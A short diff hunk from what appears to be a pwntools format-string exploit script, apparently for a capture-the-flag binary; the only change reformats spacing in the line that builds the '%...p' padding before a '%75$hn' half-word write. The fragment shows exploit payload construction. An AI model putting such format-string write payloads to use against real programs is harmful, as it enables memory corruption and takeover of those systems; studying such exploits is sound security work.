@@ -69,7 +69,7 @@ def win(io, libc):
     else:
         log.error('Unexpected number of digits to write')
 
-    payload += padding + '%' + str(lower_word-len(padding)-1) + 'p'
+    payload += padding + '%' + str(lower_word - len(padding) - 1) + 'p'
     payload += '|%75$hn|'
 
     # XXX: Below is not an issue, I'm dumb. We aren't actually writing any
